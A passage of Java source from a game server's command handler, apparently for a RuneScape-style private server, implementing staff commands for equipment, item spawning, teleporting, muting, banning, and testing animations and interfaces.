			case "completetask": {
				player.slayerTask().completed(true);
				player.slayerTask().amountKilled(player.slayerTask().taskTotal());
				player.packets().sendMessage("You've finished your slayer task. Speak to "+player.slayerTask().currentMaster()+" in "+player.slayerTask().currentMasterLocation()+" for another task.");
				return true;
			}
			
			case "render": {
				int render = Integer.valueOf(cmd[1]);
				player.setRender(render);
				player.sm("Render set: "+player.render());
				return true;
			}
			
			case "teletest": {
				player.animate(3256);
				player.graphics(2009);
				player.sm("You gather energy...");
				Game.submit(new GameTick(2.3) {
					int ticks = 0;
					public void run() {
						ticks++;
						if(ticks == 1) {
							player.animate(3248);
							player.graphics(188);
							player.sm("Your encapsulated energy allows you to take flight!");
						} else if(ticks == 3) {
							player.animate(331);
							stop();
							Game.submit(new GameTick(.5) {
								int ticks = 0;
								public void run() {
									ticks++;
									if(ticks == 3)
										player.graphics(188);
									else if(ticks == 4) {
										player.animate(-1);
										player.sm("Teleport done.");
										stop();
									}
								}
							});
						}
					}
				});
				return true;
			}
			
			case "playtime": {
				player.playTime().setPlayTime(PlayTime.DAYS, Integer.parseInt(cmd[0]));
				player.playTime().setPlayTime(PlayTime.HOURS, Integer.parseInt(cmd[1]));
				player.playTime().setPlayTime(PlayTime.MINUTES, Integer.parseInt(cmd[2]));
				player.playTime().setPlayTime(PlayTime.SECONDS, Integer.parseInt(cmd[3]));
				return true;
			}
			
			case "open": {
				int interId = Integer.parseInt(cmd[1]);
				if (interId > Misc.getInterfaceDefinitionsSize()) {
					player.packets().sendMessage(
							"Invalid Interface Id. Max is "
									+ Misc.getInterfaceDefinitionsSize() + "");
					return true;
				}
				player.interfaces().sendInterface(interId);
				for (int i = 0; i < Misc
						.getInterfaceDefinitionsComponentsSize(interId); i++) {
					player.packets().sendIComponentText(interId, i, i + "");
				}
				return true;
			}
			
			case "overlay":
				player.packets().sendOverlay(Integer.parseInt(cmd[1]));
				return true;
				
			case "removeoverlay":
				player.packets().sendRemoveOverlay();
				return true;
			
			case "endrandom": {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				if(cmd.length > 1)
					target = Game.getPlayer(name);
				else
					target = player;
				target.getRandomEvent().fullyStop();
				player.sm("Stopped random event for: "+target.getUsername());
				target.sendMessage("Ended Random Event.");
				return true;
			}
			
			case "sand": {
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				if(cmd.length > 1)
					target = Game.getPlayer(name);
				else
					target = player;
				target.getRandomEvent().start("SandwichLady");
				return true;
			}
				
			case "checkequip":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				p2 = Game.getPlayerByDisplayName(name);
				final String[] equipment = {
						"Weapon: " + p2.getEquipment().getWeaponId(),
						"Hat: " + p2.getEquipment().getHatId(),
						"Body: " + p2.getEquipment().getChestId(),
						"Legs: " + p2.getEquipment().getLegsId(),
						"Shield: " + p2.getEquipment().getShieldId(),
						"Cape: " + p2.getEquipment().getCapeId(),
						"Ring: " + p2.getEquipment().getRingId(),
						"Boots: " + p2.getEquipment().getBootsId(),
						"Gloves: " + p2.getEquipment().getGlovesId(),
						"Amulet: " + p2.getEquipment().getAmuletId(),
						"Ammo: " + p2.getEquipment().getAmmoId() };
				String text = "";
				String text2 = "";
				for (int i = 0; i < 6; i++)
					text = new StringBuilder().append(text)
							.append(equipment[i]).append(", ").toString();
				for (int i = 6; i < 11; i++)
					text2 = new StringBuilder().append(text2)
							.append(equipment[i]).append(", ").toString();
				player.sm("Worn Equipment:");
				player.sm(text);
				player.sm(text2);
				return true;
				
			case "aura":
				int worn = Integer.parseInt(cmd[1]);
				player.sm("Aura set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_AURA, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "hat":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Hat set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_HAT, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "body":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Chest set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_CHEST, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "legs":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Legs set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_LEGS, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "weapon":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Weapon set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_WEAPON, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "shield":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Shield set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_SHIELD, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "boots":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Boots set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_FEET, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "gloves":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Gloves set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_HANDS, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "ring":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Ring set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_RING, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "cape":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Cape set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_CAPE, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;
				
			case "ammo": {
				worn = Integer.parseInt(cmd[1]);
				int amount = Integer.parseInt(cmd[2]);
				player.sm("Ammo set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_ARROWS, new Item(worn, amount));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;
			}

			case "amulet":
				worn = Integer.parseInt(cmd[1]);
				player.sm("Amulet set: '"
						+ ItemDefinition.get(worn).getName()
						+ "' [" + worn + "]");
				player.getEquipment().getItems()
						.set(Equipment.SLOT_AMULET, new Item(worn));
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				return true;

			case "cacodes":
				final String[] s = { "hat", "body", "legs", "shield", "sword",
						"gloves", "boots", "ring", "cape", "amulet" };
				text = "";
				for (int i = 0; i < s.length; i++)
					text = new StringBuilder().append(text).append(";;")
							.append(s[i]).append("  ").toString();
				player.sm(text);
				return true;
				
			/*case "title": // old title system
				int titleId = Integer.valueOf(cmd[1]);
				player.getAppearance().setTitle(titleId);
				player.getAppearance().generateAppearanceData();
				player.refreshPrivateChatSetup();
				return true; */

			case "quake":
				player.packets().sendCameraShake(Integer.valueOf(cmd[1]),
						Integer.valueOf(cmd[2]), Integer.valueOf(cmd[3]),
						Integer.valueOf(cmd[4]), Integer.valueOf(cmd[5]));
				return true;
			
			case "cutscene":
				player.packets().sendCutscene(Integer.parseInt(cmd[1]));
				return true;

			case "itemoni":
				player.packets().sendItemOnIComponent(Integer.valueOf(cmd[1]),
						Integer.valueOf(cmd[3]), Integer.valueOf(cmd[2]), 1);
				return true;
				
			case "modeloni": {
				int inter = Integer.valueOf(cmd[1]);
				int model = Integer.valueOf(cmd[2]);//ItemDefinition.get(Integer.valueOf(cmd[2])).getMaleWornModelId1();
				int button = Integer.valueOf(cmd[3]);
				player.packets().sendIComponentModel(inter, button, model);
				return true;
			}
				
			case "muteall":
				for (Player targets : Game.getPlayers()) {
					if (player == null || player.isOwner())
						continue;
					targets.setMuted(Long.MAX_VALUE);
				}
				return true;

			case "unmuteall":
				for (Player targets : Game.getPlayers()) {
					if (player == null)
						continue;
					targets.setMuted(0);
				}
				return true;

			case "kill":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target == null)
					return true;
				target.applyHit(new Hit(player, target.getHitpoints(),
						HitLook.REGULAR_DAMAGE));
				target.stopAll();
				return true;
			
			case "unpermban":
				name = formatInput(cmd);
				File acc = new File("data/chars/saves/"+name.replace(" ", "_")+".player");
				target = null;
				if(target == null) {
					try {
						target = (Player) SFiles.loadSerializedFile(acc);
					} catch(Exception e) {
						e.printStackTrace();
					}
				}
				Punishments.removeBan(target);
				player.sm("You've unbanned "+target.getDisplayName()+".");
				try {
					SFiles.storeSerializableClass(target, acc);
				} catch (IOException e) {
					e.printStackTrace();
				}
				return true;
				
			case "permban":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
						player.sm("You cannot ban that person.");
						return true;
					}
					target.setPermBanned(true);
					player.sm("You've banned: "+target.getDisplayName()+" permanently.");
					target.getSession().getChannel().close();
					SFiles.savePlayer(target);
				} else {
					File file = new File("data/characters/"+name.replace(" ", "_")+".player");
					try {
						target = (Player) SFiles.loadSerializedFile(file);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
						player.sm("You cannot ban that person.");
						return true;
					}
					target.setPermBanned(true);
					player.sm("You've banned: "+target.getDisplayName()+" permanently.");
					try {
						SFiles.storeSerializableClass(target, file);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
				
			case "purchasehouse": {
				player.getHouse().setPurchasedHouse(!player.getHouse().hasPurchasedHouse());
				player.sm("Purchased House: "+player.getHouse().hasPurchasedHouse());
				return true;
			}
			
			case "buyitem": {
				int id = Integer.parseInt(cmd[1]);
				int amount = cmd.length > 2 ? Integer.parseInt(cmd[2]) : 1;
				if(id <= 0 || id > Misc.getItemsSize()) {
					player.sm("Item entered is invalid.");
					return false;
				}
				if(amount < 1) {
					player.sm("The amount cannot be less than 1.");
					return false;
				}
				if(player.getInventory().getFreeSlots() < amount && !ItemDefinition.get(id).isStackable() || 
					ItemDefinition.get(id).isStackable() && player.getInventory().getFreeSlots() < 1) {
					player.sm("Not enough free space in your inventory.");
					amount = player.getInventory().getFreeSlots();
				}
				if(!player.getInventory().containsItem(995, (ItemDefinition.get(id).getValue() * amount))) {
					player.sm("You need more coins in order to buy this.");
					return false;
				}
				player.getInventory().deleteItem(995, (ItemDefinition.get(id).getValue() * amount));
				player.getInventory().addItem(id, amount);
				player.sm("You purchase x"+amount+" "+ItemDefinition.get(id).getName().toLowerCase()+" for "
					+ ""+NumberFormat.getIntegerInstance().format(ItemDefinition.get(id).getValue() * amount)+" coins.");
				return true;
			}
			
				
			}
		}
		return false;
	}

	public static boolean processAdminCommand(final Player player,
			String[] cmd, boolean console, boolean clientCommand) {
		
		if (clientCommand) {
			
		} else {

			String name;
			Player target;
			
			GlobalObject object;

			switch (cmd[0]) {
			
			case "bank":
				player.getBank().openBank();
				return true;
			
			case "gfx":
				int g = Integer.parseInt(cmd[1]);
				player.graphics(g);
				player.sm("Graphics: "+g);
				return true;
			
			case "chatinter": {
				player.interfaces().sendChatBoxInterface(Integer.parseInt(cmd[1]));
				return true;
			}
			
			case "inventoryinter": {
				player.interfaces().sendInventoryInterface(Integer.parseInt(cmd[1]));
				return true;
			}
			
			case "shop": {
				ShopsHandler.openShop(player, Integer.parseInt(cmd[1]));
				return true;
			}
			
			case "look":
				PlayerLook.openMageMakeOver(player);
				return true;
				
			case "male":
				if(!player.getAppearance().isMale())
					player.getAppearance().male();
				else
					player.getAppearance().female();
				return true;
				
			case "getobject": {
				GlobalObject obj;
				if(player.getHouse().isAtHouse())
					obj = Game.getRegion(player.getRegionId(), true).getSpawnedObject(player, Integer.parseInt(cmd[1]));
				else
					obj = player.getRegion().getSpawnedObject(player);
                player.sm("Object: ["+obj.getId()+" - "+obj.defs().name+"] Location: ["+obj.getX()+", "+obj.getY()+", "+obj.getZ()+"] Rotation & Type: ["+obj.getRotation()+", "+obj.getType()+"]");
                return true;
            }
				
			case "emptyb":
				player.setBank(null);
				player.setBank(new Bank());
				player.getBank().setPlayer(player);
				player.sm("Bank cleared.");
				return true;
				
			case "emptye":
				player.setEquipment(null);
				player.setEquipment(new Equipment());
				player.getEquipment().setPlayer(player);
				player.refreshEquipment();
				player.getAppearance().generateAppearanceData();
				player.sm("Equipment cleared.");
				return true;
			
			case "switch":
				if (Game.pvpArea(player))
					return false;
				if (player.getCombatDefinitions().getSpellBook() == 192) {
					player.getCombatDefinitions().setSpellBook(1);
					player.packets()
							.sendMessage(
									"You feel a strange power as you learn ancient magics!");
				} else if (player.getCombatDefinitions().getSpellBook() == 193) {
					player.getCombatDefinitions().setSpellBook(2);
					player.packets()
							.sendMessage(
									"You feel a strange power as you learn lunar magics!");
				} else if (player.getCombatDefinitions().getSpellBook() == 430) {
					player.getCombatDefinitions().setSpellBook(0);
					player.packets()
							.sendMessage(
									"Power drains your body as you feel yourself going back to normal magics.");
				}
				return true;
			
			case "runes":
				for (int i = 554; i < 567; i++) {
					player.getInventory().addItem(i, 10000);
				}
				player.getInventory().addItem(9075, 10000);
				player.getInventory().addItem(21773, 10000);
				return true;

			case "unnull":
				player.packets().sendMessage("Un-nulling you..");
				SFiles.savePlayer(player);
				player.getSession().getChannel().disconnect();
				return true;

			case "sz":
				player.teleportPlayer(2833, 3859, 3);
				return true;

			case "move":
				player.setCantMove(!player.cantMove());
				player.sm("You "+(player.cantMove() ? "can't" : "can")+" move");
				return true;
				
			case "movelocation":
				player.setCantChangeLocation(!player.cantChangeLocation());
				player.sm("You "+(player.cantChangeLocation() ? "can't" : "can")+" change locations");
				return true;				

			case "item": {
				final int itemId = Integer.valueOf(cmd[1]);
				player.getInventory().addItem(itemId,
					cmd.length >= 3 ? Integer.valueOf(cmd[2]) : 1);
				return true;
			}
			
			case "multiitem": { // spawns from a to b
				int a = Integer.valueOf(cmd[1]);
				int b = Integer.valueOf(cmd[2]);
				for(int i = a; i <= b; i++)
					player.getInventory().addItem(i, 1);
				player.sm("Spawned items: "+a+" through "+b);
				return true;
			}

			case "poison":
				player.getPoison().makePoisoned(200);
				return true;
				
			case "unban":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					Punishments.removeBan(target);
					player.sm("You've unbanned: " + target.getDisplayName()+ ".");
				} else {
					name = Misc.formatPlayerNameForProtocol(name);
					if (!SFiles.containsPlayer(name)) {
						player.sm("Account name "+ Misc.formatPlayerNameForDisplay(name)+ " doesn't exist.");
						return true;
					}
					target = SFiles.loadPlayer(name);
					target.setUsername(name);
					Punishments.removeBan(target);
					player.sm("You've unbanned: " + target.getDisplayName()+ ".");
					SFiles.savePlayer(target);
				}
				return true;
	
			case "teletome":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayer(name);
				if (target == null)
					player.packets().sendMessage(
							"Couldn't find player " + name + ".");
				else
					target.setLocation(player);
				return true;

			
			case "sound":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.packets().sendSound(Integer.valueOf(cmd[1]), 0,
							cmd.length > 2 ? Integer.valueOf(cmd[2]) : 1);
				} catch (NumberFormatException e) {
					player.packets()
							.sendPanelBoxMessage("Use: ::sound soundid");
				}
				return true;
				
			case "godmode":
				player.getAppearance().setRenderEmote(1169);
				return true;
				
			case "ded":
				player.getAppearance().setRenderEmote(2161);
				return true;
				
			case "fishmode":
				player.getAppearance().setRenderEmote(869);
				return true;
				
			case "hash1":
				player.getAppearance().setRenderEmote(823);
				return true;
				
			case "unrender":
				player.getAppearance().setRenderEmote(-1);
				return true;
				
			case "voice":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.packets().sendVoice(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.packets()
							.sendPanelBoxMessage("Use: ::sound soundid");
				}
				return true;
				
			case "music":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::sound soundid effecttype");
					return true;
				}
				try {
					player.packets().sendMusic(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.packets()
							.sendPanelBoxMessage("Use: ::sound soundid");
				}
				return true;

			case "emusic":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::emusic soundid effecttype");
					return true;
				}
				try {
					player.packets().sendMusicEffect(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: ::emusic soundid");
				}
				return true;

			
			case "removecontroller":
				player.getControllerManager().forceStop();
				player.interfaces().closeScreenInterface();
				player.packets().sendRemoveOverlay();
				player.interfaces().sendInterfaces();
				player.sm("Removed Controller");
				return true;
			
			case "checkdisplay": {
				for (Player p : Game.getPlayers()) {
					if (p == null)
						continue;
					String[] invalids = { "<img", "<img=", "col", "<col=",
							"<shad", "<shad=", "<str>", "<u>" };
					for (String ss : invalids)
						if (p.getDisplayName().contains(ss)) {
							player.packets().sendMessage(
									Misc.formatPlayerNameForDisplay(p
											.getUsername()));
						} else {
							player.packets().sendMessage("None exist!");
						}
				}
				return true;
			}

			case "removedisplay":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					target.setDisplayName(Misc
							.formatPlayerNameForDisplay(target.getUsername()));
					target.packets().sendMessage(
							"Your display name was removed by "
									+ Misc.formatPlayerNameForDisplay(player
											.getUsername()) + ".");
					player.packets().sendMessage(
							"You have removed display name of "
									+ target.getDisplayName() + ".");
					SFiles.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"
							+ name.replace(" ", "_") + ".p");
					try {
						target = (Player) SFiles.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setDisplayName(Misc
							.formatPlayerNameForDisplay(target.getUsername()));
					player.packets().sendMessage(
							"You have removed display name of "
									+ target.getDisplayName() + ".");
					try {
						SFiles.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
				

			case "lvl":
				if (cmd.length < 3) {
					player.packets().sendMessage(
							"Usage ::setlevel skillId level");
					return true;
				}
				try {
					int skill = Integer.parseInt(cmd[1]);
					int level = Integer.parseInt(cmd[2]);
					player.getSkills().set(skill, level);
					player.getSkills().setXp(skill, Skills.getXPForLevel(level));
					player.getAppearance().generateAppearanceData();
					return true;
				} catch (NumberFormatException e) {
					player.packets().sendMessage(
							"Usage ::setlevel skillId level");
				}
				return true;

			case "coords":
				String message = 
						"Coords: " + player.getX() + ", " + player.getY()
						+ ", " + player.getZ() + ", regionId: "
						+ player.getRegionId() + ", rx: "
						+ player.getChunkX() + ", ry: "
						+ player.getChunkY()+" Chunk: "+player.getXInChunk()+" "+player.getYInChunk();
				player.packets().sendPanelBoxMessage(message);
				player.packets().sendMessage(message);
				return true;

			case "tab":
					player.interfaces().sendTab(
							Integer.valueOf(cmd[2]), Integer.valueOf(cmd[1]));
				
				return true;
				
			case "ban":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
						player.sm("You cannot ban that person.");
						return true;
					}
					target.setBannedDelay(Misc.currentTimeMillis() + TimeUtils.getDays(2));
					target.getSession().getChannel().close();
					player.sm("You've banned " + target.getDisplayName() + " for 48 hours.");
				} else {
					name = Misc.formatPlayerNameForProtocol(name);
					if (!SFiles.containsPlayer(name)) {
						player.sm("Account name "+ Misc.formatPlayerNameForDisplay(name)+ " doesn't exist.");
						return true;
					}
					target = SFiles.loadPlayer(name);
					target.setUsername(name);
					if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
						player.sm("You cannot ban that person.");
						return true;
					}
					target.setBannedDelay(Misc.currentTimeMillis() + TimeUtils.getDays(2));
					player.sm("You've banned " + target.getDisplayName() + " for 48 hours.");
					SFiles.savePlayer(target);
				}
				return true;

			case "killme":
				player.applyHit(new Hit(player, 2000, HitLook.REGULAR_DAMAGE));
				return true;

			case "string":
				try {
					player.interfaces().sendInterface(
							Integer.valueOf(cmd[1]));
					for (int i = 0; i <= Integer.valueOf(cmd[2]); i++)
						player.packets().sendIComponentText(
								Integer.valueOf(cmd[1]), i, "child: " + i);
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: string inter childid");
				}
				return true;
			
			case "config":
				if (cmd.length < 3) {
					player.packets()
							.sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					player.packets().sendConfig(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.packets()
							.sendPanelBoxMessage("Use: config id value");
				}
				return true;
				
			case "config1":
				if (cmd.length < 3) {
					player.packets()
							.sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					player.packets().sendConfig1(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.packets()
							.sendPanelBoxMessage("Use: config id value");
				}
				return true;
				
			case "config2":
				if (cmd.length < 3) {
					player.packets()
							.sendPanelBoxMessage("Use: config id value");
					return true;
				}
				try {
					player.packets().sendConfig2(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.packets()
							.sendPanelBoxMessage("Use: config id value");
				}
				return true;
			
			case "hit":
				player.applyHit(new Hit(player, Integer.parseInt(cmd[1]), HitLook.CANNON_DAMAGE));
				return true;

			
			case "objectanim":
				object = cmd.length == 4 ? Game.getObject(new Location(Integer
						.parseInt(cmd[1]), Integer.parseInt(cmd[2]), player
						.getZ())) : Game.getObject(
						new Location(Integer.parseInt(cmd[1]), Integer
								.parseInt(cmd[2]), player.getZ()), Integer
								.parseInt(cmd[3]));
				if (object == null) {
					player.packets()
							.sendPanelBoxMessage("No object was found.");
					return true;
				}
				player.sm(object.getId());
				player.packets().sendObjectAnimation(
						object,
						new Animation(Integer.parseInt(cmd[cmd.length == 4 ? 3
								: 4])));
				return true;
				
	
			case "viewbank":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player other1 = Game.getPlayer(name);
				try {
					player.packets().sendItems(95,
							other1.getBank().getContainerCopy());
					player.getBank().openPlayerBank(other1);
				} catch (Exception e) {
					player.packets().sendMessage(
							"The player " + name
									+ " is currently unavailable.");
				}
				return true;
			
			case "reset":
				if (cmd.length == 2) {
					player.getSkills().set(Integer.valueOf(cmd[1]), 1);
					player.getSkills().setXp(Integer.valueOf(cmd[1]),
							Skills.getXPForLevel(1));
				} else {
					player.getSkills().reset();
				}
				return true;

			case "master":
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().addXp(skill, Skills.MAXIMUM_EXP);
					return true;
				}
				try {
					if (player.getRights() > 1)
						player.getSkills().addXp(Integer.valueOf(cmd[1]),
								Skills.MAXIMUM_EXP);

				} catch (final NumberFormatException e) {
					player.packets().sendPanelBoxMessage("Use: ::master skill");
				}
				return true;

			case "bconfig":
				if (cmd.length < 3) {
					player.packets().sendPanelBoxMessage(
							"Use: bconfig id value");
					return true;
				}
				try {
					player.packets().sendGlobalConfig(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: bconfig id value");
				}
				return true;

			case "pnpc":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::tonpc id(-1 for player)");
					return true;
				}
				try {
					player.getAppearance().transformIntoNPC(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: ::tonpc id(-1 for player)");
				}
				return true;
				
			case "inter":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}
				if (Integer.valueOf(cmd[1]) >= Misc.getInterfaceDefinitionsSize()) {
					player.sm("Anti-Crash for interface -completed.");
					return true;
				}
				try {
					player.interfaces().sendInterface(
							Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true;

			case "empty":
				player.getInventory().reset();
				return true;

			case "interh":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}

				try {
					int interId = Integer.valueOf(cmd[1]);
					for (int componentId = 0; componentId < Misc
							.getInterfaceDefinitionsComponentsSize(interId); componentId++) {
						player.packets().sendIComponentModel(interId,
								componentId, 66);
					}
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true;

			case "inters":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
					return true;
				}

				try {
					int interId = Integer.valueOf(cmd[1]);
					for (int componentId = 0; componentId < Misc
							.getInterfaceDefinitionsComponentsSize(interId); componentId++) {
						player.packets().sendIComponentText(interId,
								componentId, "cid: " + componentId);
					}
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: ::inter interfaceId");
				}
				return true;

			case "tele":
				if (cmd.length < 3) {
					player.packets().sendPanelBoxMessage(
							"Use: ::tele coordX coordY");
					return true;
				}
				try {
					player.resetWalkSteps();
					player.setLocation(new Location(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]), cmd.length >= 4 ? Integer
									.valueOf(cmd[3]) : player.getZ()));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: ::tele coordX coordY plane");
				}
				return true;
				
			
			case "emote":
				if (cmd.length < 2) {
					player.packets().sendPanelBoxMessage("Use: ::emote id");
					return true;
				}
				try {
					player.setNextAnimation(new Animation(Integer
							.valueOf(cmd[1])));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage("Use: ::emote id");
				}
				return true;

			case "getrender":
				player.packets().sendMessage("Testing renders");
				for (int i = 0; i < 3000; i++) {
					try {
						player.getAppearance().setRenderEmote(i);
						player.packets().sendMessage("Testing " + i);
						Thread.sleep(600);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				return true;

			case "spec":
				player.getCombatDefinitions().resetSpecialAttack();
				return true;

			case "trylook":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 269;// 200

					@Override
					public void run() {
						if (player.hasFinished()) {
							stop();
						}

						player.getAppearance().generateAppearanceData();
						player.packets().sendMessage("Look " + i + ".");
						i++;
					}
				}, 0, 1);
				return true;
				
			case "heal":
				player.restoreHitPoints();
				player.restoreRunEnergy();
				player.getCombatDefinitions().restoreSpecialAttack();
				player.getPoison().reset();
				return true;
				
			case "tryinter":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 1;

					@Override
					public void run() {
						if (player.hasFinished()) {
							stop();
						}
						player.interfaces().sendInterface(i);
						System.out.println("Inter - " + i);
						i++;
					}
				}, 0, 1);
				return true;

			case "tryanim":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 16700;

					@Override
					public void run() {
						if (i >= Misc.getAnimationDefinitionsSize()) {
							stop();
							return;
						}
						if (player.getLastAnimationEnd() > System
								.currentTimeMillis()) {
							player.setNextAnimation(new Animation(-1));
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextAnimation(new Animation(i));
						System.out.println("Anim - " + i);
						i++;
					}
				}, 0, 3);
				return true;

			case "trygfx":
				WorldTasksManager.schedule(new WorldTask() {
					int i = 1500;

					@Override
					public void run() {
						if (i >= Misc.getGraphicDefinitionsSize()) {
							stop();
						}
						if (player.hasFinished()) {
							stop();
						}
						player.setNextGraphics(new Graphics(i));
						System.out.println("GFX - " + i);
						i++;
					}
				}, 0, 3);
				return true;

			case "gfxanim":
				int animId = Integer.parseInt(cmd[1]);
				int gfxId = Integer.parseInt(cmd[2]);
				int height = cmd.length > 3 ? Integer.parseInt(cmd[3]) : 0;
				player.setNextAnimation(new Animation(animId));
				player.setNextGraphics(new Graphics(gfxId, 0, height));
				return true;
				
			}
		}
		return false;
	}

	
	public static boolean processModCommand(Player player, String[] cmd,
